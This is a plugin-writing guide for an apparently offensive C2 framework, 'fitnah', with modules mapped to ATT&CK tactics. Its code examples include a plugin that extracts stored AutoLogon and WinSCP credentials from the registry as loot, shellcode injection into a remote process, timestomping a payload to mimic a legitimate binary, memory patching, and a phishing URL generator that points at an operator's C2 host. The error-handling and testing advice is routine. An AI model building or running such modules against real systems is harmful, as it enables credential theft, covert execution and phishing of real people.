# Plugin Development Guide

How to write a plugin that works safely in a live operation — from skeleton to production-ready.

---

## Overview

Plugins are Python classes that inherit `BasePlugin`. Drop one file in `fitnah/plugins/<category>/` and the kernel discovers it automatically on start or `reload`. No registration, no imports to change anywhere.

Every plugin **must** be safe to call when:
- There is no live session (`ctx is None`) — offline/test mode
- The implant is slow or unresponsive — timeouts must be handled
- The target raises an unexpected response — never let an exception crash the REPL

---

## File Location and Naming

```
fitnah/plugins/<category>/<plugin_name>.py
```

Categories (use the closest match):

| Category | MITRE Tactic |
|---|---|
| `recon` | Discovery (TA0007) |
| `credential_access` | Credential Access (TA0006) |
| `execution` | Execution (TA0002) |
| `lateral_movement` | Lateral Movement (TA0008) |
| `persistence` | Persistence (TA0003) |
| `privilege_escalation` | Privilege Escalation (TA0004) |
| `defense_evasion` | Defense Evasion (TA0005) |
| `collection` | Collection (TA0009) |
| `exfiltration` | Exfiltration (TA0010) |
| `initial_access` | Initial Access (TA0001) |
| `impact` | Impact (TA0040) |

File name must be lowercase with underscores: `my_plugin.py`. The class name can be anything — the kernel uses `NAME` not the class name.

---

## Minimal Plugin

```python
"""recon/whoami_bof — Run Cobalt Strike whoami BOF in-process."""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class WhoamiBOF(BasePlugin):
    NAME        = "whoami_bof"
    DESCRIPTION = "Run whoami BOF in-process — no PowerShell, no child process"
    AUTHOR      = "your-handle"
    MITRE       = "T1033"
    CATEGORY    = "recon"

    # No params needed for this one
    schema = ParamSchema()

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        r = ctx.bof("whoami")
        if r["status"] != "ok":
            return ModuleResult.err(f"whoami BOF failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="whoami")
```

That is a complete, production-safe plugin. Nothing else is required.

---

## Full Plugin Template

```python
"""<category>/<name> — Short description. MITRE T<ID>."""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class MyPlugin(BasePlugin):
    # ── identity ──────────────────────────────────────────────────────────
    NAME        = "my_plugin"           # MUST be unique across all plugins
    DESCRIPTION = "One-line description visible in search/help"
    AUTHOR      = "your-handle"
    VERSION     = "1.0.0"
    MITRE       = "T1082"               # primary ATT&CK technique
    CATEGORY    = "recon"               # maps to plugins/<category>/

    # ── parameter schema ──────────────────────────────────────────────────
    schema = ParamSchema().add(
        Param("target",  str,  required=True,
              help="IP or hostname to target"),
        Param("port",    int,  required=False, default=445,
              help="Port to connect on"),
        Param("timeout", int,  required=False, default=30,
              help="Seconds to wait for implant ACK"),
        Param("verbose", bool, required=False, default=False,
              help="Include extra diagnostic output"),
    )

    # ── lifecycle hooks (optional) ────────────────────────────────────────
    def on_load(self) -> None:
        """Called once when the plugin is imported. Use for one-time init."""

    def on_unload(self) -> None:
        """Called when the plugin is removed at runtime."""

    # ── main entry point ──────────────────────────────────────────────────
    def run(self, session, params, ctx=None) -> ModuleResult:
        # ── RULE 1: Always guard ctx=None ────────────────────────────────
        if ctx is None:
            return ModuleResult.err("Requires live session")

        # params are already validated and type-coerced by BasePlugin.validate()
        target  = params.get("target", "")
        port    = params.get("port", 445)
        timeout = params.get("timeout", 30)
        verbose = params.get("verbose", False)

        if not target:
            return ModuleResult.err("target is required")

        # ── RULE 2: Always check dispatch results ─────────────────────────
        r = ctx.exec(f"net view \\\\{target}")
        if r["status"] == "timeout":
            return ModuleResult.err(f"Timed out after {timeout}s — implant may be offline")
        if r["status"] != "ok":
            return ModuleResult.err(f"exec failed: {r['output']}")

        output = r["output"]

        # ── RULE 3: Use loot_kind to save results to the loot DB ──────────
        return ModuleResult.ok(data=output, loot_kind="net_view")
```

---

## Dispatch Methods

`ctx` provides four ways to reach the implant:

### `ctx.exec(cmd)` — Shell command

Runs a command on the implant via `CreateProcess` (no `cmd.exe` wrapper). Use for native executables, batch commands, and binary invocations.

```python
r = ctx.exec("net user /domain")
r = ctx.exec("ipconfig /all")
r = ctx.exec(r"C:\Windows\System32\whoami.exe /priv")
```

**When to use:** Any command that doesn't need PowerShell. Preferred over `ctx.ps()` — no PowerShell process, no AMSI exposure.

### `ctx.ps(cmd, timeout=None)` — PowerShell

Wraps the command in `powershell -NoProfile -NonInteractive`. Use only when you need PS-specific APIs.

```python
r = ctx.ps("Get-Process | Select-Object Name,Id | ConvertTo-Json")
r = ctx.ps("(Get-ADUser -Filter *).Count", timeout=60)
```

**When to use:** When you genuinely need PowerShell (.NET APIs, AD cmdlets, etc.). Avoid for anything that can be done with native executables or BOFs.

### `ctx.bof(name, args_b64="", arch="x64", timeout=60)` — Named BOF

Executes a pre-compiled Beacon Object File in-process on the implant. No child process, no disk write, no PowerShell. See [BOF Library Guide](BOFS.md) for the full list of 104 available BOFs.

```python
# No args
r = ctx.bof("whoami")
r = ctx.bof("ipconfig")

# With packed args
args = ctx.bof_pack("z", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion")
r = ctx.bof("reg_query", args_b64=args)

# Injection BOF (pid + shellcode)
args = ctx.bof_pack("ib", pid, shellcode_bytes)
r = ctx.bof("createremotethread", args_b64=args)
```

**When to use:** Anything in the BOF library. Preferred over all other methods — lowest detection surface.

### `ctx.bof_raw(coff_bytes, args_b64="", timeout=60)` — Arbitrary COFF

Execute any COFF `.o` file not in the library. Load it from disk or generate it dynamically.

```python
coff_bytes = Path("custom.x64.o").read_bytes()
r = ctx.bof_raw(coff_bytes, args_b64="")
```

### `ctx.send(command, args)` — Raw protocol dispatch

Send a custom command type directly to the implant's `cmd_dispatch()`. Use for commands not covered by the helpers above.

```python
r = ctx.send("hwbp_init", {})
r = ctx.send("spoof_init", {})
r = ctx.send("timestomp", {"source": "C:\\legit.exe", "target": "C:\\payload.exe"})
r = ctx.send("mem_patch", {"address": "0x7FFE1234", "patch_b64": "AAAA"})
```

---

## Return Values

### Success

```python
return ModuleResult.ok(data="output string")
return ModuleResult.ok(data={"key": "value"})          # dict also works
return ModuleResult.ok(data=output, loot_kind="creds")  # saves to loot DB
```

### Error

```python
return ModuleResult.err("Descriptive error message")
return ModuleResult.err(f"exec failed: {r['output']}")
```

### Partial success

Use when you have useful data AND an error condition:

```python
return ModuleResult.partial(
    data=partial_output,
    error="Method 3 failed: access denied",
    loot_kind="dump_partial"
)
```

### Checking results in calling code

```python
result = plugin.run(session, params, ctx)
if not result:        # False for ERROR and TIMEOUT
    print(result.error)
else:
    print(result.data)
```

---

## Parameter Types

All declared in `ParamSchema`:

```python
schema = ParamSchema().add(
    Param("name",    str,  required=True),
    Param("port",    int,  required=False, default=80),
    Param("enabled", bool, required=False, default=True),
    Param("ratio",   float, required=False, default=0.5),
)
```

Values are automatically coerced by `BasePlugin.validate()` before `run()` is called. If a required param is missing, validation raises `ValueError` before your code runs — you never see a missing required param inside `run()`.

Custom validator:

```python
Param("port", int, required=True,
      validator=lambda v: 1 <= v <= 65535,
      help="TCP port (1-65535)")
```

---

## Error Handling Rules

These rules ensure a plugin **never** crashes the REPL or corrupts state during a live operation.

### Rule 1 — Always check `ctx is None`

```python
def run(self, session, params, ctx=None) -> ModuleResult:
    if ctx is None:
        return ModuleResult.err("Requires live session")
    # ... rest of the plugin
```

The kernel calls `run()` in test/offline mode with `ctx=None`. Any call to `ctx.exec()` or `ctx.bof()` without this check will raise `AttributeError` and crash.

### Rule 2 — Always check dispatch return status

Every `ctx.exec()`, `ctx.ps()`, `ctx.bof()`, `ctx.send()` call returns a dict with `status`. Never assume success.

```python
# Wrong — crashes on timeout or network error
r = ctx.exec("whoami")
print(r["output"])   # KeyError if status is "timeout"

# Correct
r = ctx.exec("whoami")
if r["status"] == "timeout":
    return ModuleResult.err("Implant timed out")
if r["status"] != "ok":
    return ModuleResult.err(f"exec failed: {r.get('output','')}")
output = r["output"]
```

The three possible statuses:

| Status | Meaning |
|---|---|
| `"ok"` | Implant executed and returned output |
| `"error"` | Implant returned an error or dispatch failed |
| `"timeout"` | No ACK within the configured timeout |

### Rule 3 — Never use bare `except`

```python
# Wrong — swallows all errors silently
try:
    r = ctx.bof("whoami")
except:
    pass

# Correct — catch specific exceptions, return error
try:
    r = ctx.bof("whoami")
except Exception as exc:
    return ModuleResult.err(f"BOF dispatch error: {exc}")
```

### Rule 4 — Never raise exceptions from `run()`

All exceptions must be caught and returned as `ModuleResult.err()`. An uncaught exception in `run()` propagates to the kernel and prints a traceback — visible to the operator but doesn't crash. Still bad practice.

```python
# Wrong
def run(self, session, params, ctx=None):
    if not params.get("target"):
        raise ValueError("target required")  # don't do this

# Correct
def run(self, session, params, ctx=None):
    if not params.get("target"):
        return ModuleResult.err("target is required")
```

### Rule 5 — Never import at module level if the import might fail

Optional dependencies (impacket, winreg, etc.) must be imported inside `run()`:

```python
# Wrong — crashes plugin discovery if impacket not installed
import impacket.smb3

class MyPlugin(BasePlugin):
    ...

# Correct — discovery succeeds; error only when plugin is actually called
class MyPlugin(BasePlugin):
    def run(self, session, params, ctx=None):
        try:
            from impacket.smb3 import SMB3
        except ImportError:
            return ModuleResult.err("impacket not installed: pip install impacket")
        # ... continue
```

### Rule 6 — Never write to `data/` or `build/` without exception handling

```python
# Wrong
Path("data/output.txt").write_text(output)

# Correct
try:
    Path("data/output.txt").write_text(output)
except OSError as exc:
    return ModuleResult.partial(data=output, error=f"Could not write output file: {exc}")
```

### Rule 7 — Handle partial output gracefully

If a multi-step operation partially succeeds, return what you have:

```python
results = []
errors = []

for method in ["regapi", "vss", "direct"]:
    r = ctx.bof(method)
    if r["status"] == "ok":
        results.append(r["output"])
    else:
        errors.append(f"{method}: {r['output']}")

if not results:
    return ModuleResult.err(f"All methods failed: {'; '.join(errors)}")

data = "\n".join(results)
if errors:
    return ModuleResult.partial(data=data, error=f"Some methods failed: {'; '.join(errors)}")
return ModuleResult.ok(data=data, loot_kind="dump")
```

---

## BOF Argument Packing

Use `ctx.bof_pack(fmt, *values)` to pack arguments for BOF dispatch. This uses the Cobalt Strike BOF argument format.

| Format char | Type | Example |
|---|---|---|
| `z` | null-terminated ASCII string | `"domain.local"` |
| `Z` | null-terminated UTF-16LE string | `"Domain Admins"` |
| `i` | int32 | `1234` |
| `s` | int16 | `80` |
| `b` | bytes with uint32 length prefix | `b"\x90\x90"` |
| `o` | same as `b` | |

```python
# Single string arg
args = ctx.bof_pack("z", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
r = ctx.bof("reg_query", args_b64=args)

# PID (int32) + shellcode bytes
args = ctx.bof_pack("ib", pid, shellcode_bytes)
r = ctx.bof("createremotethread", args_b64=args)

# Two strings
args = ctx.bof_pack("zz", "regkey\\path", "ValueName")
r = ctx.bof("reg_delete", args_b64=args)

# String + int + string
args = ctx.bof_pack("ziz", username, group_rid, domain)
r = ctx.bof("netgroup", args_b64=args)
```

---

## Offline/Generator Plugins

Plugins that generate artefacts (phishing links, macro files, config blobs) do **not** need a live session. They should work with `ctx=None`:

```python
def run(self, session, params, ctx=None) -> ModuleResult:
    # ctx not needed — this plugin generates a file locally
    payload = self._build_macro(params.get("template"), params.get("url"))
    return ModuleResult.ok(data=payload, loot_kind="macro")
```

Do not guard with `if ctx is None: return err(...)` for these — that would break offline use.

---

## Testing Your Plugin

### Unit test template

```python
# tests/test_my_plugin.py
import pytest
from fitnah.plugins.recon.my_plugin import MyPlugin
from fitnah.sdk.testing import MockSession


def test_offline_mode():
    plugin = MyPlugin()
    session = MockSession()
    result = plugin.run(session, {}, ctx=None)
    assert result.status.value == "error"
    assert "live session" in result.error.lower()


def test_missing_required_param():
    plugin = MyPlugin()
    session = MockSession()
    with pytest.raises(ValueError, match="target"):
        plugin.validate({})   # missing required 'target'


def test_with_mock_context():
    from unittest.mock import MagicMock
    plugin = MyPlugin()
    session = MockSession()

    ctx = MagicMock()
    ctx.exec.return_value = {"status": "ok", "output": "Administrator"}

    result = plugin.run(session, {"target": "192.168.1.1"}, ctx=ctx)
    assert bool(result) is True
    assert result.data


def test_timeout_handling():
    from unittest.mock import MagicMock
    plugin = MyPlugin()
    session = MockSession()

    ctx = MagicMock()
    ctx.exec.return_value = {"status": "timeout", "output": ""}

    result = plugin.run(session, {"target": "192.168.1.1"}, ctx=ctx)
    assert result.status.value == "error"
    assert "timed out" in result.error.lower()
```

### Run only your test

```bash
python -m pytest tests/test_my_plugin.py -v
```

### Run all tests (check nothing broke)

```bash
python -m pytest tests/ -q
```

### Test plugin discovery

```bash
python -c "
from fitnah.orchestration.kernel import Kernel
k = Kernel.__new__(Kernel)
k._load_plugins()
found = [p for p in k._plugins if p.NAME == 'my_plugin']
print('Found:', found)
"
```

---

## Practical Examples

### Example 1 — Simple BOF recon plugin

```python
"""recon/arp_local — Dump ARP table via arp BOF."""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import ParamSchema


class ArpLocal(BasePlugin):
    NAME        = "arp_local"
    DESCRIPTION = "Dump local ARP cache using arp BOF (no PowerShell)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1016"
    CATEGORY    = "recon"
    schema      = ParamSchema()

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        r = ctx.bof("arp")
        if r["status"] == "timeout":
            return ModuleResult.err("BOF timed out")
        if r["status"] != "ok":
            return ModuleResult.err(f"arp BOF failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="arp")
```

### Example 2 — Plugin with multiple dispatch paths

```python
"""credential_access/reg_creds — Extract credentials from registry."""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class RegCreds(BasePlugin):
    NAME        = "reg_creds"
    DESCRIPTION = "Query registry for stored credentials (AutoLogon, WinSCP, etc.)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1552.002"
    CATEGORY    = "credential_access"

    schema = ParamSchema().add(
        Param("target", str, required=False, default="all",
              help="all | autologon | winscp | putty"),
    )

    _KEYS = {
        "autologon": (
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            "DefaultPassword"
        ),
        "winscp": (
            r"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions",
            ""
        ),
    }

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        target = params.get("target", "all")
        keys = self._KEYS if target == "all" else {k: v for k, v in self._KEYS.items() if k == target}
        if not keys:
            return ModuleResult.err(f"Unknown target: {target}. Use: {', '.join(self._KEYS)}")

        results = []
        errors  = []

        for name, (key, value) in keys.items():
            args = ctx.bof_pack("zz", key, value) if value else ctx.bof_pack("z", key)
            r = ctx.bof("reg_query", args_b64=args)
            if r["status"] == "ok" and r["output"].strip():
                results.append(f"[{name}]\n{r['output']}")
            elif r["status"] == "timeout":
                errors.append(f"{name}: timeout")
            else:
                errors.append(f"{name}: {r.get('output','error')}")

        if not results:
            return ModuleResult.err(f"No credentials found. Errors: {'; '.join(errors)}")

        data = "\n\n".join(results)
        if errors:
            return ModuleResult.partial(data=data, error=f"Some queries failed: {'; '.join(errors)}",
                                        loot_kind="reg_creds")
        return ModuleResult.ok(data=data, loot_kind="reg_creds")
```

### Example 3 — Offline generator plugin

```python
"""initial_access/url_shortener — Generate a tracking URL for phishing."""
import secrets
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class UrlShortener(BasePlugin):
    NAME        = "url_shortener"
    DESCRIPTION = "Generate a one-time tracking URL for phishing campaigns"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1566"
    CATEGORY    = "initial_access"

    schema = ParamSchema().add(
        Param("redirect_to", str, required=True, help="URL to redirect victim to"),
        Param("c2_host",     str, required=True, help="Operator IP/hostname for delivery server"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        # No ctx needed — this is an offline generator
        token = secrets.token_urlsafe(12)
        url   = f"http://{params['c2_host']}/d/{token}"
        return ModuleResult.ok(
            data=f"Tracking URL: {url}\nRedirects to: {params['redirect_to']}\nToken: {token}",
            loot_kind="phish_url",
        )
```

---

## Import Rules

### Safe SDK imports (always available)

```python
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
from fitnah.sdk.testing import MockSession
```

### Standard library imports — always fine

```python
import os, sys, json, re, base64, hashlib, time, random, struct
from pathlib import Path
from typing import Any
```

### Third-party imports — guard inside `run()`

```python
def run(self, session, params, ctx=None):
    try:
        import impacket
    except ImportError:
        return ModuleResult.err("impacket not installed: pip install impacket")
```

### Never import from orchestration/ or c2/ in a plugin

The kernel, session manager, C2 server, and router are not available to plugins. Access the session only through the `session` parameter and the network only through `ctx`.

---

## Hot Reload

After writing or editing a plugin:

```
reload
```

The kernel re-imports all changed files. `on_unload()` is called on old instances, `on_load()` on new ones. Running sessions are unaffected. You do **not** need to restart the framework.

If your plugin has a syntax error, `reload` will print the traceback and skip that file — all other plugins continue working.
